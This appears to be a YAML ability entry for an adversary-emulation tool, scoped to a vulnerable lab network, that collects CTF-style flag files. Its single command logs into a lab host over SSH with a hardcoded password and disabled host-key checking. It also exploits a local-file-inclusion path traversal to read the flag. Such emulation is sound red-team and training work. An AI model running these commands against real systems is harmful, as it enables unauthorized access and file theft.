- id: col02-flag-collect
  name: Flag File Collection
  description: Collect all flag files from compromised hosts
  tactic: collection
  technique:
    attack_id: T1005
    name: Data from Local System
  platforms:
    linux:
      sh:
        command: |
          sshpass -p 'toor' ssh -o StrictHostKeyChecking=no labuser@10.0.20.21 'cat /var/lib/vulnlab/.flag' 2>/dev/null; curl -s 'http://10.0.20.21:9001/?vuln=lfi&file=../../../../var/lib/vulnlab/.flag' 2>/dev/null

  singleton: false
  repeatable: false
